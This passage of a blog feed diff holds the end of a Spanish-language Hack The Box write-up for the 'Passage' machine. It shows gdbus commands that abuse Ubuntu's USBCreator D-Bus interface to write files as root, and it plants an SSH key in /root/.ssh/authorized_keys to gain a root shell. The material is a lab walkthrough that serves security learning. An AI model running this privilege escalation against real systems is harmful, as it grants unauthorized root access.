+&lt;/div&gt;&lt;p&gt;Ahora vamos a crear un archivo en la direccion &lt;code&gt;/&lt;/code&gt; con un archivo temporal en &lt;code&gt;/tmp/test.txt&lt;/code&gt; y vemos que el archivo se creo en &lt;code&gt;/test.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nadav@passage:~$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;USBCreator D-Bus interface&amp;#34;&lt;/span&gt; &amp;gt; /tmp/test.txt
+&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;USBCreator D-Bus interface&amp;#34;&lt;/span&gt; &amp;gt; /tmp/test.txt
+nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/test.txt /test.txt &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
+&amp;lt;method com.ubuntu.USBCreator.Image /tmp/test.txt /test.txt &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;             
+&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
+nadav@passage:~$ ls -lah /test.txt
+ls -lah /test.txt
+-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 01:47 /test.txt
+nadav@passage:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Para obtener una shell con usuario root vamos a crear el archivo &lt;code&gt;authorized_keys&lt;/code&gt; en la carpeta &lt;code&gt;/root/.ssh/&lt;/code&gt; y asi vamos a poder acceder a este usuario mediante SSH de la misma forma que con &lt;code&gt;nadav&lt;/code&gt;. Primero vamos a copiar el archivo &lt;code&gt;id_rsa.pub&lt;/code&gt; del usuario actual a &lt;code&gt;/tmp/authorized_keys&lt;/code&gt;, luego creamos el archivo:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/authorized_keys /root/.ssh/authorized_keys &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Nos conectamos por medio de SSH y logramos obtener una shell y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_025742.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/htb/passage/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/htb/passage/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>cute news cms</category>
+            
+          
+            
+              <category>usbcreator d bus</category>
+            
+          
+            
+              <category>rce</category>
+            
+          
+        
+        
+          
+            
+              <category>hackthebox</category>
+            
+          
+            
+              <category>linux</category>
+            
+          
+        
+        
+      </item>
       
       <item>
         <title>Hack The Box - Doctor</title>
